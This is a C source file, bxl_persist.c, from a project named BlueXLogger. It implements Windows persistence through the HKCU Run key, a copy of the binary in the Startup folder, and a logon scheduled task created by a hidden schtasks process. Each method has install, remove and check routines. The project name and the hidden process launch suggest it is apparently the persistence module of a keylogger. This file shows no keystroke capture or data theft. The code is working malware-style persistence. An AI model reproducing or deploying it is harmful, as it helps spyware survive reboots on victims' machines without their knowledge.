/*============================================================================
 * BlueXLogger - bxl_persist.c
 * Optional persistence mechanisms (all off by default).
 *
 * Created by Xencode-CLI by xanthorox
 *==========================================================================*/
#include "bxl_persist.h"
#include "bxl_util.h"

/*==========================================================================
 * Run key (HKCU\...\Run)
 *========================================================================*/
static const wchar_t k_run_key[] =
    L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

static int runkey_install(const wchar_t *exe_path)
{
    HKEY  hkey = NULL;
    LONG  rc;
    DWORD cb;

    if (!exe_path) return BXL_FALSE;

    rc = RegCreateKeyExW(HKEY_CURRENT_USER, k_run_key, 0, NULL,
                         REG_OPTION_NON_VOLATILE, KEY_SET_VALUE,
                         NULL, &hkey, NULL);
    if (rc != ERROR_SUCCESS) {
        bxl_logf("persist: RegCreateKeyEx failed (%ld)", rc);
        return BXL_FALSE;
    }

    cb = (DWORD)((wcslen(exe_path) + 1) * sizeof(wchar_t));
    rc = RegSetValueExW(hkey, BXL_RUNKEY_NAME, 0, REG_SZ,
                        (const BYTE *)exe_path, cb);
    RegCloseKey(hkey);

    if (rc != ERROR_SUCCESS) {
        bxl_logf("persist: RegSetValueEx failed (%ld)", rc);
        return BXL_FALSE;
    }
    return BXL_TRUE;
}

static int runkey_remove(void)
{
    HKEY hkey = NULL;
    LONG rc;

    rc = RegOpenKeyExW(HKEY_CURRENT_USER, k_run_key, 0, KEY_SET_VALUE, &hkey);
    if (rc != ERROR_SUCCESS) return BXL_TRUE;   /* nothing to remove */

    rc = RegDeleteValueW(hkey, BXL_RUNKEY_NAME);
    RegCloseKey(hkey);
    return (rc == ERROR_SUCCESS || rc == ERROR_FILE_NOT_FOUND)
         ? BXL_TRUE : BXL_FALSE;
}

static int runkey_installed(void)
{
    HKEY  hkey = NULL;
    LONG  rc;
    wchar_t buf[MAX_PATH * 2];
    DWORD cb = (DWORD)sizeof(buf);
    DWORD type = 0;

    rc = RegOpenKeyExW(HKEY_CURRENT_USER, k_run_key, 0, KEY_QUERY_VALUE, &hkey);
    if (rc != ERROR_SUCCESS) return BXL_FALSE;

    rc = RegQueryValueExW(hkey, BXL_RUNKEY_NAME, NULL, &type,
                          (BYTE *)buf, &cb);
    RegCloseKey(hkey);
    return (rc == ERROR_SUCCESS && type == REG_SZ) ? BXL_TRUE : BXL_FALSE;
}

/*==========================================================================
 * Startup folder
 *========================================================================*/
static int startup_dir(wchar_t *out, size_t out_cch)
{
    wchar_t appdata[MAX_PATH * 2];

    if (FAILED(SHGetFolderPathW(NULL, CSIDL_STARTUP, NULL, 0, appdata)))
        return BXL_FALSE;

    return SUCCEEDED(StringCchCopyW(out, out_cch, appdata));
}

static int startup_install(const wchar_t *exe_path)
{
    wchar_t dir[MAX_PATH * 2];
    wchar_t dest[MAX_PATH * 2];

    if (!exe_path) return BXL_FALSE;
    if (!startup_dir(dir, BXL_COUNT_OF(dir))) return BXL_FALSE;
    if (!bxl_path_join(dest, BXL_COUNT_OF(dest), dir, L"BlueXLogger.exe"))
        return BXL_FALSE;

    if (bxl_path_exists(dest)) return BXL_TRUE;

    if (!CopyFileW(exe_path, dest, FALSE)) {
        bxl_logf("persist: startup copy failed (%lu)", GetLastError());
        return BXL_FALSE;
    }
    return BXL_TRUE;
}

static int startup_remove(void)
{
    wchar_t dir[MAX_PATH * 2];
    wchar_t dest[MAX_PATH * 2];

    if (!startup_dir(dir, BXL_COUNT_OF(dir))) return BXL_FALSE;
    if (!bxl_path_join(dest, BXL_COUNT_OF(dest), dir, L"BlueXLogger.exe"))
        return BXL_FALSE;

    return bxl_file_delete(dest);
}

static int startup_installed(void)
{
    wchar_t dir[MAX_PATH * 2];
    wchar_t dest[MAX_PATH * 2];

    if (!startup_dir(dir, BXL_COUNT_OF(dir))) return BXL_FALSE;
    if (!bxl_path_join(dest, BXL_COUNT_OF(dest), dir, L"BlueXLogger.exe"))
        return BXL_FALSE;

    return bxl_path_exists(dest);
}

/*==========================================================================
 * Scheduled task
 *========================================================================*/
static int run_schtasks(const wchar_t *args)
{
    wchar_t cmd[MAX_PATH * 4];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    DWORD rc;

    if (FAILED(StringCchPrintfW(cmd, BXL_COUNT_OF(cmd),
                                L"schtasks.exe %s", args)))
        return BXL_FALSE;

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));

    if (!CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        bxl_logf("persist: schtasks launch failed (%lu)", GetLastError());
        return BXL_FALSE;
    }

    WaitForSingleObject(pi.hProcess, 30000);
    {
        DWORD code = 1;
        GetExitCodeProcess(pi.hProcess, &code);
        rc = code;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return (rc == 0) ? BXL_TRUE : BXL_FALSE;
}

static int schtask_install(const wchar_t *exe_path)
{
    wchar_t args[MAX_PATH * 3];
    if (!exe_path) return BXL_FALSE;
    if (FAILED(StringCchPrintfW(args, BXL_COUNT_OF(args),
                                L"/create /tn \"%s\" /tr \"\\\"%s\\\"\" "
                                L"/sc onlogon /f",
                                BXL_TASK_NAME, exe_path)))
        return BXL_FALSE;
    return run_schtasks(args);
}

static int schtask_remove(void)
{
    wchar_t args[256];
    if (FAILED(StringCchPrintfW(args, BXL_COUNT_OF(args),
                                L"/delete /tn \"%s\" /f", BXL_TASK_NAME)))
        return BXL_FALSE;
    return run_schtasks(args);
}

static int schtask_installed(void)
{
    wchar_t args[256];
    if (FAILED(StringCchPrintfW(args, BXL_COUNT_OF(args),
                                L"/query /tn \"%s\"", BXL_TASK_NAME)))
        return BXL_FALSE;
    return run_schtasks(args);
}

/*==========================================================================
 * Public API
 *========================================================================*/
const char *bxl_persist_name(int method)
{
    switch (method) {
    case BXL_PERSIST_OFF:       return "disabled";
    case BXL_PERSIST_RUNKEY:    return "HKCU Run key";
    case BXL_PERSIST_STARTUP:   return "Startup folder";
    case BXL_PERSIST_SCHEDTASK: return "Scheduled task (on logon)";
    default:                    return "unknown";
    }
}

int bxl_persist_install(int method, const wchar_t *exe_path)
{
    switch (method) {
    case BXL_PERSIST_OFF:       return BXL_TRUE;
    case BXL_PERSIST_RUNKEY:    return runkey_install(exe_path);
    case BXL_PERSIST_STARTUP:   return startup_install(exe_path);
    case BXL_PERSIST_SCHEDTASK: return schtask_install(exe_path);
    default:
        bxl_logf("persist: unknown method %d", method);
        return BXL_FALSE;
    }
}

int bxl_persist_remove(int method)
{
    switch (method) {
    case BXL_PERSIST_OFF:       return BXL_TRUE;
    case BXL_PERSIST_RUNKEY:    return runkey_remove();
    case BXL_PERSIST_STARTUP:   return startup_remove();
    case BXL_PERSIST_SCHEDTASK: return schtask_remove();
    default:                    return BXL_FALSE;
    }
}

int bxl_persist_is_installed(int method)
{
    switch (method) {
    case BXL_PERSIST_RUNKEY:    return runkey_installed();
    case BXL_PERSIST_STARTUP:   return startup_installed();
    case BXL_PERSIST_SCHEDTASK: return schtask_installed();
    default:                    return BXL_FALSE;
    }
}

int bxl_persist_apply(int method, const wchar_t *exe_path)
{
    if (method == BXL_PERSIST_OFF) return BXL_TRUE;

    if (bxl_persist_is_installed(method)) return BXL_TRUE;

    bxl_logf("persist: installing via %s", bxl_persist_name(method));
    return bxl_persist_install(method, exe_path);
}
